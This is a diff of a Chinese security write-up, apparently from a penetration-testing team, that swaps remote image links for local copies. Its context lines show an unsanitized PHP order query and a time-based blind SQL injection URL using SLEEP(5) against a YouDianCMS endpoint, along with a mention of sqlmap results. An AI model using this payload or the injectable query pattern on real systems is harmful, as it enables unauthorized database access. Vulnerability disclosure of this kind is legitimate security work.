@@ -267,7 +267,7 @@ debug 调试
 $order = $m->where("OrderID=$OrderID")->field('MemberID,OrderNumber')->find();
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUibOh0HVJNHr4rlkTxn3wQOsMBvmTfBBtwZn4Dr0LQFk3FDXU74jJsO3wZebJ1U9sc6icFvia8a4qQw/640?wx_fmt=png)
+![](../../.resource/remote/793bfa554b21e3b9d86eb7deed30c3ece006eb6db0f3002a2655a2381895307d.png)
 
 构造注入 延时 5 秒
 
@@ -275,11 +275,11 @@ $order = $m->where("OrderID=$OrderID")->field('MemberID,OrderNumber')->find();
 http://youdiancms.io:8888/index.php/Member/Mobile/receiveOrder/id/1 AND (SELECT x FROM  (SELECT(SLEEP(5)))x)
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUibOh0HVJNHr4rlkTxn3wQO1ALmYSQKhRUguAnJYGCjNPRRd4V5Hsiacf0wAic31giaZZgvOQNGQVH8w/640?wx_fmt=png)
+![](../../.resource/remote/378b10b29bce40e6eb0f4100eaed278640ac8a06e5ea2958a4280ac8cec1054d.png)
 
 SQLMAP 下结果
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUibOh0HVJNHr4rlkTxn3wQO6ZBffpVhXJXotDVNU8duOPHXqgqOZUX3YAmddAw7CjUAHxOHtJF4CA/640?wx_fmt=png)
+![](../../.resource/remote/c92ca0c4c5a4ee243d984e16d141ae48f1a0375f972900bf409b9465546b4311.png)
 
 _**招聘启事**_
 
@@ -405,7 +405,7 @@ bountyteam@dbappsecurity.com.cn
 
 bountyteam@dbappsecurity.com.cn
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JUibOh0HVJNHr4rlkTxn3wQOxyjFSOy2HlbTp3V0qq2zRnCSUfUBlyKRHTWZxfwia1k3MUWgAFle4YQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/f4327d21abf06cb5aee017a52dcfdce2b684e0c81ae0dd00bd95f7c4497a5d02.jpg)
 
 专注渗透测试技术
 
@@ -413,7 +413,7 @@ bountyteam@dbappsecurity.com.cn
 
 END
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JX5icUxKxKKCb9FU6ZFOtlkcGTmicaJW9kEOQuGzEqjrEwGK1RCH3ez0ibytXGic3uHOoUjNcUic2UlibQA/640?wx_fmt=jpeg)
+![](../../.resource/remote/47c33c96fe3b23ebfaefe8c09c5b93d558f8e3cf3cffb1f190619656eaeae147.jpg)
 
 ---
 
